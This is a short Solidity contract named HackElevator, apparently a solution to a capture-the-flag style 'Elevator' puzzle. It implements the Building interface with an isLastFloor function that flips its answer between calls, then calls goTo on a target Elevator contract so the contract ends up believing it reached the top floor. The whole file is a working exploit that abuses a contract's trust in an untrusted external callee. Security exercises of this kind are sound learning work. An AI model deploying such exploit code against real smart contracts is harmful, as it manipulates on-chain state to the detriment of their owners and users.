// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Building.sol";
import "./Elevator.sol";

contract HackElevator is Building {
    bool internal _isSecondCall;

    constructor(){}

    function isLastFloor(uint256) external override returns (bool){
        _isSecondCall = !_isSecondCall;
        return !_isSecondCall;        
    }

    function hack(address _elevatorContractAddr) external {
        Elevator elevatorContract = Elevator(_elevatorContractAddr);
        elevatorContract.goTo(0);
    }
}